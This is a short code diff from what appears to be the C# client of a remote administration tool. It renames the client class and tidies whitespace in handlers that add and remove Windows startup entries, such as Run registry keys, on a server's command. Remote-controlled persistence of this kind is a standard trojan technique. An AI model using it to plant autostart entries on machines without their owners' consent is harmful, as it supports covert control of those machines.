@@ -12,7 +12,7 @@ namespace Client.Controllers
     {
         public static bool is64Bit = Environment.Is64BitOperatingSystem;
 
-        public static void getStartupItems(GetStartupItems packet, ClientMosaic client)
+        public static void getStartupItems(GetStartupItems packet, ClientMosaique client)
         {
             try
             {
@@ -82,14 +82,14 @@ namespace Client.Controllers
 
         }
 
-        public static void doStartupItemAdd(DoStartupItemAdd packet, ClientMosaic client)
+        public static void doStartupItemAdd(DoStartupItemAdd packet, ClientMosaique client)
         {
             try
             {
                 switch (packet.type)
                 {
                     case 0:
-                        if(!addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
+                        if (!addRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", packet.name, packet.path, true))
                         {
                             throw new Exception("Coul not add value");
                         }
@@ -151,13 +151,13 @@ namespace Client.Controllers
 
                 }
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 new SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
             }
         }
 
-        public static void doStartupItemRemove(DoStartupItemRemove packet, ClientMosaic client)
+        public static void doStartupItemRemove(DoStartupItemRemove packet, ClientMosaique client)
         {
             try
             {
